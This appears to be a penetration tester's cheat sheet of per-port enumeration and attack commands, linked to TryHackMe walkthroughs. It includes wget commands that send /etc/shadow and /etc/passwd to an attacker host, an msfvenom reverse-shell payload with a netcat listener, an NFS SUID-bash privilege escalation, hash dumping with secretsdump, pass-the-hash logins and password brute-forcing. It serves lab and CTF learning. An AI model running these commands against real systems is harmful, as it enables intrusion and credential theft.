# Enumeration

## **Stopped at** ToolsRus

## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

Even longer scan

**Kali**

```
nmap -sC -sV -p- $VICTIM
```

## **Ports**

## TCP/21 - **FTP**

### **Common Credentials**

#### Usernames

```
anonymous
admin
guest
```

#### Passwords

```
anonymous
password
guest
```

### Access FTP

**Kali**

```
ftp $VICTIM 21
```

### List files

**Kali(ftp)**

```
ls
```

#### List files (using Curl)

**Kali**

```
curl ftp://anonymous:anonymous@$VICTIM:21
```



### Download  files

Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).

**Kali(ftp)**

```
binary
passive
```

**Kali(ftp)**

```
get $fileName.txt
```

#### Download all files

**Kali(ftp)**

```
mget *
```

#### Download all files to the current directory (using Wget)

**Kali**

```
wget -m ftp://anonymous:anonymous@$VICTIM:21 -nd
```

### Upload files

Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).

**Kali(ftp)**

```
binary
passive
```

**Kali(ftp)**

```
put file.txt
```



## **TCP/22 - SSH**

### SSH into host

**Kali**

```
ssh $USERNAME@$VICTIM

#SSH into non-standard port
ssh $USERNAME@$VICTIM -p2222
```

### Check this page for cracking examples

[#ssh](cheat-sheets/credential-gathering-and-cracking.md#ssh "mention")

## **TCP/25 - SMTP**

**Kali**

```
telnet $VICTIM 25
HELO
VRFY root
QUIT
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-commands 
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -
```

**Kali**

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VICTIM
```



### Check for vulnerabilities&#x20;

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-vuln* 
```

### Check this page for cracking examples

[#smtp](cheat-sheets/credential-gathering-and-cracking.md#smtp "mention")



## **UDP/53 - DNS**

### Find subdomains

**Example**

[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")

**Kali**

```
dig -t AXFR $HOST.thm @$DNSSERVER
```

## **TCP/80:443 - HTTP(s)**

Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)

### Info gathering info

```
http://$VICTIM/robots.txt
http://$VICTIM/sitemap.xml
```



### Find Directories

This looks for all php files under folder cvs

**Kali**

```
ffuf -u http://$VICTIM/cvs/FUZZ.php -w /usr/share/wfuzz/wordlist/general/common.txt
```

**Kali**

```
dirb http://$VICTIM/
dirb http://$VICTIM:$PORT/
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt -z10 
```



### Find Pages

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

**Kali**

```
gobuster dir --url http://$VICTIM/ -w /usr/share/dirb/wordlists/big.txt -l
```

**Kali**

```
ffuf -u http://$VICTIM/static/FUZZ -w /usr/share/dirb/wordlists/big.txt
```

**Kali**

```
dirsearch -u $VICTIM:$PORT 
```

### Download file

#### wget

**Victim**&#x20;

```
wget http://$VICTIM/$FILE

#From non-strandard port
wget http://$VICTIM:81/$FILE
```

#### **certutil**

**Example**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

**Victim**&#x20;

```
certutil -urlcache -f http://$KALI:81/$FILE $FILE
```

### Send File

#### wget

**Examples**

[wgel-ctf.md](../walkthroughs/tryhackme/wgel-ctf.md "mention")

**Victim**

```
nc -lvnp 4444
```

**Victim**

```
sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
sudo -u root /usr/bin/wget --post-file=/etc/passwd $KALI:4444
```

### Find Vulnerabilities&#x20;

Nikto Tuning (-T) Options

```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

#### Scan for misconfigurations

```
nikto -h $VICTIM -T 2 -Format txt 
```

#### Scan for SQL injection vulnerabilities.

```
nikto -h $VICTIM -T 9 -Format txt 
```

#### Authenticated nikito scan

**Examples**

[toolsrus.md](../walkthroughs/tryhackme/toolsrus.md "mention")

**Kali**

```
nikto -id $USERNAME:$PASSWORD -h http://$VICTIM:80/manager/html
```

#### Check for Shellshock

```
nmap -p 80 $VICTIM --script http-shellshock 
```

#### **Check for  Heartbleed**

```
nmap -p 443  $VICTIM --script ssl-heartbleed
```



### Run Web server

#### Kali

```
python2 -m SimpleHTTPServer 81
```

### Wordpress

#### Scan wordpress site

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

#### Kali

```
wpscan --url http://$VICTIM
```

#### Enumerate wordpress site

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

#### Kali

```
wpscan --url http://$VICTIM--enumerate u
```

#### Bruteforce admin page

#### Kali

```
wpscan --url http://$VICTIM --passwords /usr/share/wordlists/rockyou.txt
```

## Jenkins

#### Reverse Shell

**Examples**

[#jenkins-web](../walkthroughs/tryhackme/internal.md#jenkins-web "mention")



## UDP/88 - Kerberos

#### Username Enumeration

```
kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
```

## **TCP/110 - POP3**

```
telnet $VICTIM 110
USER root
PASS root
RETR 1
QUIT
```

## **TCP/135 - RPC**

**Kali**

```
rpcclient -U '' $VICTIM
srvinfo
netshareenum # print the real file-path of shares; good for accurate RCE
```

## **TCP/139 - NetBIOS**

**Examples**&#x20;

[gatekeeper.md](../walkthroughs/tryhackme/gatekeeper.md "mention")

**Kali**

```
nbtscan $VICTIM
```

**Examples**

[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")

**Kali**

```
enum4linux $VICTIM
```

## **UDP/161 - SNMP**

## **Collect Information**

**Examples**

[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")

**Kali**

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
./snmpcheck-1.9.rb $VICTIM -c $COMMUNITYSTRING
```

## **TCP/389 - LDAP**

### Enumerating Active Directory

**Examples**

[enumerating-active-directory.md](../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

### Breaching Active Directory

**Examples**

[breaching-active-directory.md](../walkthroughs/tryhackme/breaching-active-directory.md "mention")

### Exploiting Active Directory

**Examples**

[exploiting-active-directory.md](../walkthroughs/tryhackme/exploiting-active-directory.md "mention")

### Persisting Active Directory

**Examples**

[persisting-active-directory.md](../walkthroughs/tryhackme/persisting-active-directory.md "mention")

## **TCP/445  - SMB**

### Scanning

**Examples**

[basic-pentesting.md](../walkthroughs/tryhackme/basic-pentesting.md "mention")

**Kali**

```
nmap $VICTIM --script=smb-enum*
```

### **Common Credentials**

#### Usernames

```
anonymous
admin
guest
```

### **List Shares**

**Option #1**

**Examples**

[gatekeeper.md](../walkthroughs/tryhackme/gatekeeper.md "mention")[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")[basic-pentesting.md](../walkthroughs/tryhackme/basic-pentesting.md "mention")

**Kali**

```
smbclient -L //$VICTIM/ 

# List shares on a non-standard SMB/Samba port
smbclient -L //$VICTIM/ -p $PORT 
```

**Option #2**&#x20;

**Examples**

[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")

**Victim**

```
net share
```



### Download files&#x20;

#### Option #1

**Kali**

```
smbclient \\\\$VICTIM\\$SHARE
prompt
mget *
```

#### Option #2

**Kali**

```
smbmap -H $VICTIM
smbmap -H $VICTIM-P $PORT
```

#### Option #3

**Kali**

```
smbget -R smb://$VICTIM/$SHARE

# List shares on a non-standard SMB/Samba port
smbget -R smb://$VICTIM:$PORT/$SHARE
```

### Upload files

#### Option #1

**Kali**

```
smbclient \\\\$VICTIM\\$SHARE
put $FILE
```

### Detect Vulnerabilities

```
# Check if vulnerable to EternalBlue
sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 
```

```
# Check if vulnerable to SambaCry
sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version
```

## **TCP/667 - IRC**

```
irssi -c $VICTIM -p $PORT
```

## **TCP/873 - RSYNC**

```
sudo nmap $VICTIM -p873 --script rsync-list-modules
rsync -av rsync://$VICTIM/$SHARE --list-only
rsync -av rsync://$VICTIM/$SHARE loot
```

## **TCP/2049 - NFS**

<pre><code><strong>sudo nmap $VICTIM -p111 --script-nfs*
</strong></code></pre>

```
#This will list some folders hopefully
showmount -e $VICTIM
#Make a dir
mkdir /mnt/nfs
#/opt/conf is just an example, put what came out after showmount
mount $VICTIM:/opt/conf /mnt/nfs
cd /mnt/nfs
```

**Upload ID\_RSA key to login**

```
ssh-keygen -t rsa
cp ~/.ssh/id_rsa.pub authorized_keys
rsync authorized_keys rsync://rsync-connect@$VICTIM/files/sys-internal/.ssh
Password: pass

ssh $USERNAME@$VICTIM
```

**Create mount**

```
sudo mkdir /mnt/FOO
mount -t nfs $VICTIM:$SHARE /tmp/mount/ -nolock
sudo mount //$VICTIM:/$SHARE /mnt/FOO
```

**Interesting loot to look for**

<pre><code><strong>- id_rsa from users home directories
</strong></code></pre>

**Privilege Escalation**

Example of how you can get root shell. All commands except the last one are run on our Kali machine where we can control the permissions fully. Then we just run the exploit as the normal user we already have access to.

```
#Download exploit
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

mv bash /mount/point
chown root /mount/point/bash
chmod +u /mount/point/bash
chmod +d /mount/point/bash

#SSH in as victim and run the following
/mount/point/bash -p
```

## **TCP/3306 - SQL**

```
mysql -u $USER -h $VICTIM
```

## **TCP/3389 - RDP**

### **Scan**

**Kali**

```
sudo nmap $VICTIM -p3389 --script rdp-ntlm-info 
```

### **Login to host**

**Kali**

```
rdesktop -u $USERNAME $VICTIM
```

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

**Kali**

```
xfreerdp /u:$USERNAME /p:$PASSWORD /cert:ignore /v:$VICTIM /workarea  +clipboard
```

##

## **TCP/5327 - Postgres**

```
psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
SELECT pg_ls_dir('/');
```

## **TCP/5985 - WinRM**

Login with found username and password

```
evil-winrm -u $USER -p $PASSWORD -i $VICTIM
```

Login with found username and hash

```
evil-winrm -i $VICTIM -u $VICTIMUSERNAME  -H $FOUNDHASH
```

Dump hashes of other users if the user you have access to has the privilege's to do so. If it does we can potentially use these hashes with evil-winrm to login as these other users.

```
python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
```

## TCP/7070 - AnyConnect

**Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)

For code above and just had to change the shellcode and ip variable.

**Kali**

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```

**Kali**

```
nc -lvnp 4444
```

###

####

\
